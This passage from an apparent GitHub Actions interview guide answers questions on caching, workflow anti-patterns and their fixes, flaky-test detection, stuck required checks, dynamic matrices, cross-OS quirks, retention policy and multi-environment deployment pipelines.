                   instead of the download cache       (~/.npm, ~/.m2) not node_modules
no warm start      missing restore-keys               add a stable prefix fallback
cross-branch cold  expected (branch scoping)          warm the default branch; feature branches fall back
```

**High miss rate** almost always means the `key` includes something that changes every run — a commit SHA, a timestamp, a `run_id`. The fix is to key the *exact* match on the **lockfile hash** (`hashFiles('**/package-lock.json')`) so it only invalidates when dependencies actually change, and add `restore-keys` with a stable prefix so even a lockfile change gets a *partial* warm start (last build's deps, then install just the delta) instead of a full cold download. **Stale hits** are the opposite — a key with no lockfile hash never invalidates, so you serve last month's `node_modules` even after deps changed; the fix is to *add* the lockfile hash to the exact key. Because caches are **immutable once written**, you can't "update" one — you change the key (which is why people version-suffix keys like `-v2` to force a reset).

**Bloat/eviction** usually means caching the wrong thing: caching `node_modules` (huge, platform-specific, regenerated) instead of the *download cache* (`~/.npm`, `~/.m2/repository`, pip's wheel cache) blows the budget and evicts your other caches under LRU. The correct target is the manager's *download* cache — the thing that's expensive to *fetch*, not the thing that's cheap to *rebuild from* it. I'd also remember **branch scoping**: feature branches only read their own and the default branch's caches, so a brand-new branch is *expected* to be cold and falls back to the default-branch cache — the operational implication is to keep the **default branch's cache warm** (it runs on every merge) so every new branch inherits a good baseline. The senior synthesis: caching problems are keying problems — exact key on the lockfile (correct invalidation), stable `restore-keys` prefix (warm starts), cache the download layer not the built layer (avoid bloat), and warm the default branch (cross-branch baseline). The anti-pattern is keying on the commit SHA (100% miss) or omitting the lockfile (100% stale).

#### Q76. [Practical] You inherit a workflow riddled with anti-patterns. Name the worst ones you'd look for and how you'd remediate each.

Inheriting a workflow is a code review of *security and reliability* first, *style* second, and there's a recognizable greatest-hits list of anti-patterns I'd hunt for, roughly in order of how much damage they do. The remediation for each is concrete, not just "fix it."

```
anti-pattern                                  why it's dangerous              remediation
─────────────────────────────────────────    ────────────────────────────    ───────────────────────────
pull_request_target + checkout PR code        RCE: secrets to strangers       split untrusted CI from privileged CD; use workflow_run
${{ github.event.*.title }} in run:           shell injection                  route untrusted input through env vars; "$VAR"
actions pinned to @v4 / @main                 supply-chain (tag hijack)        SHA-pin + Dependabot bumps
GITHUB_TOKEN default broad perms              over-privileged blast radius     permissions: contents: read default, grant per-job
static cloud keys as secrets                  standing credential leak         migrate to OIDC, delete the keys
::set-output / upload-artifact@v3             deprecated/retired → silent fail bump to $GITHUB_OUTPUT / @v4
no concurrency on CI                          stale runs waste minutes         cancel-in-progress: true (CI), false (deploy)
deploy a mutable :latest tag                  prod ≠ tested bits               deploy by immutable digest
no timeouts                                   6h hung-job minute burn          timeout-minutes at job + step
echo of secrets / derived secrets             leak (masking is exact-match)    stop logging; ::add-mask:: derived values
```

I'd triage by **blast radius**, not by what's easiest. The genuinely dangerous ones go first: `pull_request_target` that checks out and runs PR code is a remote-code-execution hole handing secrets to any internet stranger — I'd rip it out and re-architect as untrusted `pull_request` CI (no secrets) plus a `workflow_run` privileged follow-up. Direct interpolation of attacker-controllable fields (`github.event.issue.title`, branch names, commit messages) into `run:` is shell injection — remediated by binding them to `env:` and referencing `"$VAR"` so they're *data*, not *code*. Mutable action refs (`@v4`/`@main`) are the `tj-actions`-class supply-chain risk — SHA-pin and add Dependabot. Broad `GITHUB_TOKEN` permissions and static cloud keys are over-privilege — default the token to `contents: read` with per-job grants and migrate cloud auth to OIDC.

The reliability anti-patterns come next: deploying a mutable `:latest` tag (so prod runs different bits than were tested → deploy by immutable digest), no `concurrency` (stale CI runs burn minutes and stale deploys race → `cancel-in-progress: true` for CI, `false` for deploys), no timeouts (a hung job burns the 6-hour default → `timeout-minutes`), and deprecated/retired actions (`::set-output`, `upload-artifact@v3`, `checkout@v1`) that *silently fail* after their cutoff. My remediation *process* matters as much as the list: I wouldn't big-bang rewrite — I'd fix the RCE/injection/credential holes *immediately* (they're live risk), then land the reliability fixes incrementally with the pipeline running so I can verify each change doesn't break it, and finally extract the now-clean common parts into a reusable workflow so the fixes are *durable* and don't regress in the next copy-paste. The expert signal is prioritizing by blast radius (security holes before style), knowing each anti-pattern's *specific* remediation, and making the fixes structural (reusable workflow + policy checks) so they stay fixed.

#### Q77. [Practical] How would you build observability into your Actions pipelines to answer "is CI healthy?" across an org?

"Is CI healthy?" is a fleet-level question that per-run logs can't answer, so I'd build observability around **metrics that aggregate across runs** rather than relying on individuals eyeballing red X's. The DORA-aligned metrics are the backbone: **lead time** (commit → deployed), **deployment frequency**, **change-failure rate**, and **MTTR** — plus CI-specific health signals: **pass rate** per workflow/branch, **p50/p95 duration** (is CI getting slower?), **queue/wait time** (are we runner-starved?), **flaky-test rate** (tests that pass on retry), and **cost/minutes** trends. The point is to turn CI from an anecdote ("it feels slow lately") into a dashboard with trends and alerts on *regressions*.

```
data sources → store → visualize/alert
  GitHub Actions API / webhooks (workflow_run, workflow_job events)
  GITHUB_STEP_SUMMARY for human-readable per-run reports
         │
         ▼  push run metadata (status, duration, queue time, attempt)
  metrics backend (Datadog / Prometheus+Grafana / a warehouse)
         │
         ▼
  dashboards: pass-rate, p95 duration, queue time, flake rate, cost
  alerts: main pass-rate < 95%, p95 duration regression, queue time spike
```

The implementation: GitHub emits `workflow_run` and `workflow_job` **webhook events** (and the same data via the API) carrying conclusion, timing, runner, and attempt count — I'd pipe those into a metrics backend (Datadog, or a warehouse for richer analysis, or Prometheus via an exporter). For per-run human consumption, I'd use `GITHUB_STEP_SUMMARY` to render a test/coverage report on the run page (separate from logs). The crucial distinction is **per-run feedback** (the developer sees their run's summary and failures) versus **fleet observability** (the platform team sees pass-rate trends, the on-call sees a main-branch health alert) — both matter, and they're different surfaces.

What makes it *useful* rather than a vanity dashboard is alerting on the right *regressions* and attributing them. I'd alert when **main-branch pass rate drops below a threshold** (CI is broken, not just one PR), when **p95 duration regresses** (something got slow — a removed cache, a bloated test suite), and when **queue time spikes** (runner starvation — scale up). Flaky-test rate is especially valuable as a *leading* indicator: a rising flake rate predicts developer frustration and auto-retry abuse before it shows up as missed deadlines. The senior framing is that observability's job is to answer fleet questions (health, speed, cost, flakiness *trends*) and catch *regressions* automatically — not to produce a wall of green/red that humans must interpret. The anti-pattern is "we look at the Actions tab when someone complains" — reactive, unattributed, and blind to slow degradation.

#### Q78. [Practical] A required status check is blocking all PRs from merging even though "nothing changed." Diagnose the stuck-check scenarios.

A required check that blocks every PR is a *merge-gate* problem, and there's a well-known family of causes, all stemming from the mismatch between what branch protection *expects* to report and what *actually* reports. The pattern is "the PR waits forever for a check that will never arrive," and the diagnosis is to find *why the expected check never reports a status*.

```
stuck required check — cause matrix
─────────────────────────────────────────────────────────────────────
1. path-filtered workflow skipped  → never reports → PR waits forever
2. job was RENAMED                 → ruleset names old check → new name never satisfies it
3. workflow file deleted/moved     → expected check no longer exists → unsatisfiable
4. fork PR has no secrets          → secret-dependent job errors/never completes
5. check name set on a job that    → e.g. a matrix job whose name varies → ruleset name mismatch
   doesn't always run
6. workflow never triggered        → on: filters exclude PRs → no run → no status
```

The most common cause is **a path filter skipping the workflow**: if `ci.yml` has `paths: ['src/**']` and the PR only touches docs, the workflow *doesn't run*, so it *never reports a status* — and a required check that never reports is unsatisfiable, freezing the PR. The fix is either a **status-reporting shim** (a companion job that always runs and reports success for the skipped case) or using GitHub's "skipped checks count as required passing" behavior carefully, or restructuring so the required workflow always runs but skips its *expensive steps*. The second common cause is a **renamed job**: branch protection references a check by its *name*, so renaming the job (or changing a matrix dimension that's part of the name) means the old required name is never satisfied and the new one isn't required — the ruleset and reality have drifted.

Other scenarios: the workflow file was **deleted or moved** (the required check no longer exists, so it's permanently unsatisfiable — fix the ruleset to stop requiring it); a **fork PR** where a required job depends on secrets it doesn't have (the job errors or hangs); or the workflow's `on:` filters simply **never match PRs** so no run starts. The diagnostic method: open a blocked PR, look at the merge box — it tells you *which named check* is "Expected" but not reported. Then find that name: does a workflow produce it, did it run, was it skipped, was it renamed? The fix is to **reconcile the required-check names in the ruleset with the actual job names that always report**, and to ensure required workflows either always run or have a shim that reports for the skipped case. The senior insight is that "required status check" is a *name-matching contract* between branch protection and your workflows — and path filters + job renames are the two ways that contract silently breaks, freezing merges with no obvious error.

#### Q79. [Coding] Write a workflow that detects flaky tests by re-running failures and reports the flake rate, without masking real failures.

The design tension is exactly the one from the retry question: I want to *detect* flakiness without *hiding* real failures, so a naive "retry until green" is wrong — it would make a genuinely broken test pass and ship nondeterminism. The correct approach **separates the signal**: run the suite once; if it fails, re-run *only the failures* to classify each as **flaky** (failed then passed → record it, but don't let it gate) or **genuinely broken** (failed consistently → fail the build). The build's pass/fail is driven by the *consistent* failures; the flakes are *reported* (and ideally filed as tickets) but tracked separately so they get fixed rather than silently auto-retried forever.

```yaml
name: Flaky Test Detection
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      - run: npm ci

      - name: First pass
        id: run1
        run: npx jest --json --outputFile=run1.json || echo "failed=true" >> "$GITHUB_OUTPUT"

      - name: Re-run only failures (classify, don't mask)
        if: steps.run1.outputs.failed == 'true'
        run: |
          # extract failed test names from run1, re-run just those
          jq -r '.testResults[].assertionResults[]
                 | select(.status=="failed") | .fullName' run1.json > failed.txt
          echo "::group::Re-running $(wc -l < failed.txt) failed tests"
          npx jest --json --outputFile=run2.json \
            $(sed 's/.*/-t "&"/' failed.txt) || true
          echo "::endgroup::"

      - name: Classify flaky vs broken and gate the build
        if: steps.run1.outputs.failed == 'true'
        run: |
          # passed-on-rerun = FLAKY (report); still-failing = BROKEN (fail build)
          comm -23 <(sort failed.txt) \
                   <(jq -r '.testResults[].assertionResults[]
                            | select(.status=="failed") | .fullName' run2.json | sort) \
            > flaky.txt
          broken_count=$(jq '[.testResults[].assertionResults[]
                              | select(.status=="failed")] | length' run2.json)

          {
            echo "## Flaky Test Report"
            echo "| category | count |"
            echo "|---|---|"
            echo "| flaky (passed on rerun) | $(wc -l < flaky.txt) |"
            echo "| broken (consistent)     | $broken_count |"
            echo ""; echo "### Flaky tests (file tickets, do NOT ignore):"
            sed 's/^/- /' flaky.txt
          } >> "$GITHUB_STEP_SUMMARY"

          # Build FAILS only on consistent failures — flakes are reported, not masked
          if [ "$broken_count" -gt 0 ]; then
            echo "::error::$broken_count tests failed consistently — real failures"
            exit 1
          fi
          echo "::warning::$(wc -l < flaky.txt) flaky tests detected — see summary"
```

```
run all ──┬─ all pass ──────────────────────────────▶ ✅ build passes
          └─ some fail ─▶ re-run ONLY failures
                            ├─ now passes → FLAKY  → report (summary + ticket), don't gate
                            └─ still fails → BROKEN → ❌ fail the build
gate = consistent failures only;  flakes are surfaced, never silently retried-away
```

The principles that keep this honest: (1) **the build still fails on real failures** — a test that fails consistently fails the build, so correctness gating is intact; (2) **flakes are *surfaced*, not buried** — they go to the step summary and ideally to auto-filed issues, creating pressure to *fix* them rather than letting auto-retry hide them forever; (3) **bounded re-runs** (one re-run of just the failures, not infinite retries) so a deterministically-broken suite doesn't loop. The complexity note: re-running only the failed subset keeps the extra cost proportional to the *number of failures*, not a full second suite run.

The trade-off and anti-pattern: the seductive wrong version is `jest --retry 3` everywhere, which makes the suite "green" while shipping a quality gate that lies — a 1-in-4 flaky test is a *bug* (a race, an order-dependence, a time/network assumption) that will eventually fail in a way retries can't paper over. So the senior framing is "detect and *track* flakiness as a first-class metric driving fixes" rather than "retry until green." Over time the flake report feeds a quarantine list and a fix backlog, and a rising flake rate is a leading indicator of test-suite decay — exactly the observability signal from the CI-health question.

#### Q80. [Practical] Your workflow simply doesn't trigger at all on an event you expected. Walk through the diagnostic checklist.

"It didn't run" (no run appears in the Actions tab) is a different problem from "it ran and failed" — there's no log to read because the event never produced a run, so the diagnosis is entirely about **admission control**: did the event match, and was the workflow eligible to start? I'd walk a checklist from most-to-least common. First, **filters**: do the `on:` `branches`/`tags`/`paths` filters actually match the event? A push to a branch not in `branches`, or a change that only touches files excluded by `paths-ignore`, produces *no run and no log* — silent by design. Second, **file location and validity**: the workflow must be in `.github/workflows/` on the *ref the event targets*, and a YAML syntax error makes the file invalid (GitHub shows it in the Actions tab as a problem, not a run).

```
"workflow never triggered" checklist
1. on: filters match?  (branches / tags / paths / event type)         ← most common
2. file in .github/workflows/ ON THE TARGET REF, and valid YAML?
3. for schedule/dispatch: is it on the DEFAULT branch? (feature branch won't fire cron)
4. Actions enabled for the repo/org? (Settings → Actions; can be disabled)
5. recursive-trigger guard: GITHUB_TOKEN-pushed commits do NOT re-trigger workflows
6. fork PR from first-time contributor: needs maintainer "Approve and run"
7. scheduled workflow auto-disabled after ~60 days of repo inactivity
8. event simply doesn't carry the trigger (e.g. expecting push on a tag-only filter)
```

The non-obvious causes are where experience shows. **Default-branch sourcing**: `schedule` and `workflow_dispatch` only read the workflow from the *default branch*, so a brand-new cron or dispatch added on a feature branch will never appear until merged — a frequent "my cron doesn't run" puzzle. **Recursive-trigger suppression**: a commit pushed *by* the `GITHUB_TOKEN` (a bot bumping a version) does **not** trigger `push` workflows — a deliberate loop-breaker, but it surprises people expecting their auto-commit to kick off CI (the fix is a PAT or App if you genuinely need the re-trigger). **Disabled Actions**: the repo or org may have Actions disabled or the specific workflow toggled off. **Auto-disabled crons**: GitHub disables scheduled workflows after ~60 days of repo inactivity.

The method is to *confirm the event payload matched the filters* before suspecting anything exotic — most "didn't trigger" cases are a branch/path filter or a wrong-branch workflow file, not a platform bug. The senior habit is to reason at the admission layer (event → filter match → eligible → dispatch) rather than diving into step logs that don't exist, and to know the small set of *silent* suppressors (default-branch sourcing, token-push loop-break, auto-disabled crons) that produce no run and no error.

#### Q81. [Practical] A step fails with "Resource not accessible by integration" / 403 from the GitHub API. How do you fix it correctly?

That error is the `GITHUB_TOKEN` being **under-privileged** for the API call you attempted — the token is repo-scoped and its permissions come from the `permissions:` block (or the repo/org default), and you've asked it to do something (comment on a PR, push a tag, write to packages, create a deployment) that its current scopes don't allow. The fix is *not* to reach for a personal access token (the common over-correction) — it's to **grant the specific scope the operation needs**, keeping least-privilege intact.

```yaml
# 403 when commenting on a PR or issue → needs write on that scope
permissions:
  contents: read
  pull-requests: write     # grant ONLY what the failing call needs
  issues: write
```

The subtlety that trips people is the **replace-not-merge** semantics of `permissions`: declaring a job-level `permissions` block *entirely replaces* the workflow default for that job, so adding `packages: write` can paradoxically *break* a previously-working `git push` step by dropping the `contents: write` it implicitly relied on. So when fixing a 403 you must re-list *all* the scopes that job needs, not just the new one. I'd identify the exact scope from the API endpoint (PR comments → `pull-requests` or `issues`; tags/releases → `contents`; GHCR push → `packages`; OIDC → `id-token`) and grant precisely that.

```
403 "Resource not accessible by integration" → token missing a scope
  symptom call                  needed permission
  comment on PR/issue           pull-requests: write / issues: write
  push commit / create release  contents: write
  push to GHCR                  packages: write
  request OIDC JWT              id-token: write
  create deployment/status      deployments: write / statuses: write
gotcha: job-level permissions REPLACE the workflow block → re-list everything
```

The other two causes worth ruling out: a **fork PR** has a hard read-only token regardless of `permissions:` — you *cannot* grant write on a fork PR, so a step that comments or pushes will 403 by design, and the correct architecture is to do that privileged work in a `workflow_run` follow-up (trusted context, real token) rather than fighting the fork boundary. And the **org/repo default** may be locked to read-only, in which case your `permissions:` grant is the thing that unlocks it per-job. The senior framing is: a 403 from the API means "grant the precise missing scope per-job," *not* "use a PAT" — reaching for a long-lived PAT to dodge a permissions error trades a one-line scope grant for a standing credential and a larger blast radius, which is exactly backwards.

#### Q82. [Practical] How do you generate a matrix dynamically at runtime (e.g. one job per changed service) instead of hardcoding it?

A hardcoded matrix can't express "one job per service that actually changed" or "one job per environment defined in a config file," so the pattern is a **two-job setup**: a first job computes a JSON array and exposes it as an *output*, and a second job consumes it via `strategy.matrix.include: fromJSON(...)`. This is how you build data-driven fan-out — the set of jobs is determined at runtime from the repo's state (changed files, a config file, an API response) rather than baked into YAML.

```yaml
jobs:
  discover:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.gen.outputs.matrix }}
    steps:
      - uses: actions/checkout@v4
      - id: gen
        run: |
          # build a JSON array of changed services (any logic that emits JSON)
          services=$(ls services/ | jq -R -s -c 'split("\n")[:-1] | map({service: .})')
          echo "matrix=$services" >> "$GITHUB_OUTPUT"   # e.g. [{"service":"api"},{"service":"web"}]

  build:
    needs: discover
    if: needs.discover.outputs.matrix != '[]'      # guard the EMPTY case!
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.matrix) }}
    steps:
      - run: ./build.sh ${{ matrix.service }}
```

```
discover job ──▶ emits JSON array as output ──▶ build job: matrix.include = fromJSON(output)
   "[{service:api},{service:web}]"                  → 2 jobs, one per element
empty array "[]" ──▶ matrix produces ZERO jobs ──▶ guard with if: != '[]'
```

The mechanics and pitfalls: the output must be a **valid JSON string** (job outputs are always strings, so you emit serialized JSON and `fromJSON` parses it in the consumer). The single most common bug is the **empty-matrix case**: if `discover` finds no changed services, the array is `[]`, which expands to *zero jobs* — and if that `build` job is a **required status check**, the PR hangs waiting for a check that never reports. You must guard it: an `if: needs.discover.outputs.matrix != '[]'` skip plus a status-reporting shim, or emit a sentinel element. The second pitfall is JSON correctness — a trailing newline or unescaped quote produces an invalid-matrix error, so I build the JSON with `jq -c` (compact, correct escaping) rather than hand-concatenating strings.

The use cases this unlocks: per-changed-service builds in a monorepo (combine with `paths-filter` to compute the changed set), per-environment deploys read from a config file, sharding where the shard count is computed from test-file count, or fanning out over a list returned by an API. The trade-off vs a static matrix is **observability and predictability** — a dynamic matrix is harder to read at a glance (you can't see the job set without running `discover`) and a bug in the generator can silently produce zero or wrong jobs, so I keep the generator simple, log the emitted JSON, and always handle the empty case. The senior signal is knowing the `fromJSON(output)` → `matrix.include` pattern *and* immediately flagging the empty-array/required-check foot-gun that bites teams in production.

#### Q83. [Practical] Caching works on Linux but a Windows/macOS matrix leg is slow or behaves differently. What cross-OS runner quirks bite you?

Cross-OS matrices expose a pile of platform differences that "works on my Linux runner" hides, and caching is one of the sharpest. **Caches are keyed and stored per-OS** in practice because the cached *contents* are platform-specific — a Linux `node_modules` with native binaries won't work on Windows — so your cache `key` must include `${{ runner.os }}` (the built-in `setup-*` caches do this automatically). If you omit it, a Windows leg either misses (because the Linux-keyed cache doesn't match) or, worse, restores incompatible binaries. So a "Windows cache is slow" complaint is often a *missing OS in the key* causing perpetual misses, or caching the wrong (platform-specific) directory.

```
cross-OS quirks that bite
─────────────────────────────────────────────────────────────
cache key       must include runner.os; contents are OS-specific (native binaries)
default shell   Linux/macOS = bash; Windows = pwsh → your bash-isms break
path separators \ vs /; $GITHUB_WORKSPACE; case-insensitive FS on Win/mac
line endings    Windows CRLF can break scripts/checks (git autocrlf)
billing         Windows 2× minutes, macOS 10× → matrix cost skews to those legs
tool paths      brew/choco vs apt; preinstalled tool versions differ per image
perf            macOS/Windows runners generally slower than Linux for the same work
```

The **default shell** difference is the next big one: on Linux/macOS a `run:` block uses `bash`, but on **Windows it uses PowerShell (`pwsh`)** by default — so a step with bash syntax (`export X=y`, `&&` chains, `$VAR`) silently behaves differently or fails on the Windows leg. The fix is to set `shell: bash` explicitly on cross-OS steps (bash *is* available on Windows runners via Git Bash) so the same script runs everywhere, or to write genuinely portable commands. Path handling compounds this: backslash vs forward-slash separators, case-insensitive filesystems on Windows/macOS (so `MyFile` and `myfile` collide), and CRLF line endings that can break scripts or trip up linters.

The operational quirks: **billing multipliers** mean the Windows (2×) and macOS (10×) legs dominate cost out of proportion to their count, so I run them only where they catch real bugs (often on `main`/nightly, not every PR draft); **preinstalled tooling differs** across runner images (different default Node/Python/Xcode versions), so pinning versions with `setup-*` actions is essential for reproducibility; and macOS/Windows runners are generally **slower** for equivalent work, so a leg that's "slow" may just be the platform, not a cache bug. The senior approach is to treat each OS as its own environment — OS in the cache key, `shell: bash` for script portability, version-pinned toolchains, portable path handling — and to be deliberate about *when* the expensive legs run given the multiplier. The anti-pattern is assuming Linux behavior is universal and discovering on the Windows leg that your shell, paths, and cache key all silently differ.

#### Q84. [Practical] Logs, artifacts, and caches are filling storage / hitting limits. Design a retention and cleanup policy.

Each of the three has a *different* retention model and cleanup lever, so a coherent policy treats them separately rather than as one "storage" problem. **Logs** are retained per the repo/org setting (default ~90 days, configurable down) and are usually the smallest concern. **Artifacts** count against storage and have a **retention period** (default ~90 days, settable per-upload via `retention-days` or org-wide) — they're the usual storage hog because builds upload large binaries every run. **Caches** have a separate budget (~10 GB per repo) with **LRU eviction** and a ~7-day idle expiry — they self-manage by eviction, but a too-large cache footprint causes thrashing (your useful caches get evicted by transient ones).

```
                retention model            cleanup lever
logs            ~90d default (configurable) lower the repo/org log retention setting
artifacts       ~90d default, per-upload    retention-days: on upload; scheduled API delete
caches          ~10GB budget, LRU + 7d idle bump keys to reset; gh cache delete; scope keys tighter

policy by intent:
  ephemeral debug artifact  → retention-days: 1–7
  release/compliance asset  → long retention OR move to durable store (S3/registry)
  PR-build artifacts        → short retention + delete on PR close
```

The policy I'd set: **match retention to the artifact's purpose**. Throwaway debug artifacts (a failed run's logs-as-files) get `retention-days: 1`–`7`; PR-build artifacts get short retention and ideally a scheduled cleanup that deletes them when the PR closes; release/compliance artifacts (SBOMs, signed binaries) that must persist for *years* don't belong in Actions artifact storage at all — push them to a durable, cheaper store (S3, a registry, a release asset) with its own lifecycle policy. For caches, the budget is self-evicting, but I'd keep keys *scoped and lean* (cache the download cache, not bloated `node_modules`) so the 10 GB isn't wasted, and use the `gh cache` API or `gh actions-cache` to delete stale keys when a dependency overhaul leaves orphaned entries.

The automation: a **scheduled cleanup workflow** that uses the GitHub API to delete artifacts older than N days or from closed PRs, since the built-in retention is a blunt global setting and you often want finer, intent-based rules. For self-hosted/GHES this is *critical* — artifacts and logs consume *your* disk, so unbounded retention is an outage waiting to happen, not just a bill. The senior framing is: three resources, three models — logs (lower the global retention), artifacts (per-upload retention + scheduled deletion + offload long-term assets to durable storage), caches (self-evicting, keep keys lean) — and the governing principle is "set retention to the artifact's actual lifetime and put truly-durable things in a durable store, not Actions." The anti-pattern is uploading every build's full output with default 90-day retention and wondering why storage costs climb.

#### Q85. [Practical] How do you choose between blue-green and canary deployment, and how does that choice show up in your Actions pipeline?

Both reduce deployment risk but along different axes, and the choice changes what your pipeline orchestrates. **Blue-green** runs two complete environments — the live "blue" and an idle "green" — deploys the new version to green, validates it fully, then **flips all traffic at once** (and keeps blue warm for instant rollback). **Canary** keeps one environment but shifts traffic **gradually** (1% → 10% → 50% → 100%), watching health metrics at each step and rolling back if they degrade. The fundamental trade-off: blue-green gives an *instant, atomic* cutover and trivial rollback (flip back to blue) but **doubles infrastructure** during the switch and exposes 100% of users at the flip moment; canary limits blast radius to a *fraction* of users at any time and needs no duplicate environment, but is slower and requires real traffic-shifting + metric analysis.

```
                  blue-green                     canary
infra cost        2× during switch               1× (one env, weighted traffic)
exposure          0% then 100% (atomic flip)     gradual fraction (1→10→50→100)
rollback          flip back to blue (instant)    shift weight back to stable
needs             a router/LB to swap targets    weighted routing + metric analysis
detects bad rel.  in green validation pre-flip   from REAL traffic metrics during ramp
pipeline role     deploy green → smoke → flip    deploy canary → soak/watch → promote
best for          fast atomic cutover, easy back small-blast-radius, metric-gated rollout
```

In the **pipeline**, the difference is the orchestration shape. Blue-green is: deploy to the idle environment, run a *full* validation/smoke-test suite against green (it's getting zero real traffic, so you can test it hard), then a single step flips the router and an optional step keeps blue around for a rollback window. Canary is: deploy at a low weight, then a **soak-and-watch loop** that polls SLO metrics (error rate, p99) and either ramps up or aborts (shifts traffic back) — the gate is *real user metrics*, not just "did it deploy." As with the canary question, Actions is the *orchestrator*; the actual traffic mechanics live in your LB/mesh/controller (Argo Rollouts, Flagger), and a long soak loop is better delegated to a controller than held open in a brittle workflow step.

How I'd choose: **blue-green when the cutover must be atomic and instant-rollback matters more than gradual exposure** (e.g. a stateful service where you can't easily run two versions side-by-side serving the same users, or a release where partial rollout would be inconsistent), and you can afford the temporary 2× infra. **Canary when limiting the *fraction* of affected users is the priority and you have good real-time metrics** to gate on (high-traffic stateless services where 1% is still a meaningful signal). Many mature setups combine them (blue-green at the environment level, canary for traffic ramp within green). Both demand the same foundations from the pipeline: deploy by **immutable digest** (so the rollback target is the exact tested artifact), a **protected environment gate** for the promotion, **OIDC** credentials, and an **always-reachable rollback**. The senior framing is matching the strategy to the risk profile (atomic-cutover-with-easy-rollback vs gradual-metric-gated-exposure) and recognizing Actions triggers/decides while the substrate shifts traffic — not pretending a workflow loop is a deployment controller.

#### Q86. [Practical] A composite action behaves differently than the same steps inlined in the job. What composite-specific gotchas explain it?

Composite actions *look* like "just my steps in a file," but several behaviors differ from inlining, and those differences are exactly where "it worked inline but breaks as a composite" bugs live. The first and most common: every `run:` step in a composite **must declare `shell:`** — there's no default — so a step that worked inline (inheriting the job's default shell) fails or behaves oddly when moved into a composite if you forget `shell: bash`. The second: **secrets are not automatically available** to a composite action's steps the way they are to inline steps; you must pass them in as `inputs` (or read them in the caller and pass them through), because a composite doesn't transparently inherit the caller's `secrets` context.

```yaml
# composite gotchas in one file
runs:
  using: composite
  steps:
    - run: ./build.sh
      shell: bash                      # REQUIRED — no default shell in composites
    - run: echo "result=ok" >> "$GITHUB_OUTPUT"
      shell: bash
      id: step1
outputs:
  result:
    value: ${{ steps.step1.outputs.result }}   # must EXPLICITLY map step output → action output
inputs:
  token:                               # secrets come in as inputs, not the secrets context
    required: true
```

```
behavior            inline step              composite action
default shell        job default              NONE — must set shell: per run
secrets context      available                NOT auto — pass via inputs
step outputs         visible to later steps   must map to outputs: at action level to expose
GITHUB_ENV / PATH    persist to job           persist to the job (shared) — can surprise
working directory    job workspace            same workspace, but relative paths can differ
if: on a step        evaluated normally       supported, but composite has no job-level if
```

The third gotcha is **output exposure**: a step's output inside a composite is visible to *later steps in the composite*, but to expose it to the *calling job* you must declare it in the action's top-level `outputs:` and map it (`value: ${{ steps.x.outputs.y }}`). Inline, the step output is just there; in a composite there's an extra mapping layer, and forgetting it means the caller sees nothing. There's also a **state-sharing surprise**: `GITHUB_ENV` and `GITHUB_PATH` written inside a composite *do* persist to the rest of the job (they share the runner), which can be unexpected if you assumed the composite was isolated — it isn't, it's spliced inline, so it can leak env/PATH changes into subsequent job steps.

The reasoning that ties it together: a composite action runs *inside the calling job on the same runner* (it's not a separate process or container), so it shares the filesystem, env, and workspace — but it has its own *contract boundary* for shells, secrets, and outputs that inline steps don't. So the "behaves differently" bugs are almost always: a missing `shell:`, a secret that's no longer in scope (pass it as an input), or an output that wasn't mapped up to the action level. The senior framing is knowing that composites are *inlined-but-with-a-contract* — same runner, but explicit shell/inputs/outputs — and that the migration from inline-to-composite must add `shell:`, convert secrets to inputs, and map outputs, or the extracted action silently misbehaves.

#### Q87. [Practical] Design a multi-environment promotion pipeline (dev → staging → prod) with the right gates and credential isolation at each stage.

The goal is a **promotion pipeline** where the *same tested artifact* flows through environments of increasing sensitivity, each with stricter gates and *isolated* credentials, so a compromise or mistake at a low environment can't reach a high one. The spine is: build/sign the artifact **once**, reference it by **immutable digest** everywhere, and promote that exact digest dev → staging → prod — never rebuild per environment (a rebuild could produce different bits than were tested). Each environment is a GitHub **Environment** with its own protection rules and its own **OIDC role**, so the credentials are scoped per stage and never shared.

```yaml
# (build job omitted) — outputs an immutable digest, signed once
deploy-dev:
  needs: build
  environment: dev                 # no gate: auto-deploy on every main merge
  permissions: { id-token: write, contents: read }
  steps:
    - uses: aws-actions/configure-aws-credentials@v4
      with: { role-to-assume: arn:aws:iam::111...:role/gha-dev, aws-region: us-east-1 }
    - run: ./deploy.sh dev "$IMAGE_DIGEST"

deploy-staging:
  needs: deploy-dev
  environment: staging             # gate: automated integration tests + short soak
  permissions: { id-token: write, contents: read }
  steps:
    - uses: aws-actions/configure-aws-credentials@v4
      with: { role-to-assume: arn:aws:iam::222...:role/gha-staging, aws-region: us-east-1 }
    - run: ./deploy.sh staging "$IMAGE_DIGEST" && ./integration-tests.sh staging

deploy-prod:
  needs: deploy-staging
  environment: production          # gate: required reviewer + branch policy + wait timer
  permissions: { id-token: write, contents: read }
  steps:
    - uses: aws-actions/configure-aws-credentials@v4
      with: { role-to-assume: arn:aws:iam::333...:role/gha-prod, aws-region: us-east-1 }
    - run: ./deploy.sh production "$IMAGE_DIGEST"   # SAME digest as dev/staging
```

```
build (sign once) ─▶ dev ─────▶ staging ──────────▶ [⏸ reviewer] ─▶ prod
  immutable digest    auto       integ tests+soak     manual gate      same digest
  separate OIDC role:  gha-dev    gha-staging          gha-prod (trust pinned to env:production)
  blast radius:        low        medium               isolated — dev creds can't touch prod
```

The **gates escalate** with sensitivity: dev auto-deploys on every merge (fast feedback, low stakes); staging gates on **automated integration tests + a soak** (catch real-environment issues before prod); prod gates on a **required human reviewer + deployment branch policy (only `main`/`release/*`) + optionally a wait-timer canary soak**. This is the right place to invest gating effort — the cost of a bad dev deploy is near zero, the cost of a bad prod deploy is an incident, so the gate strength tracks the cost.

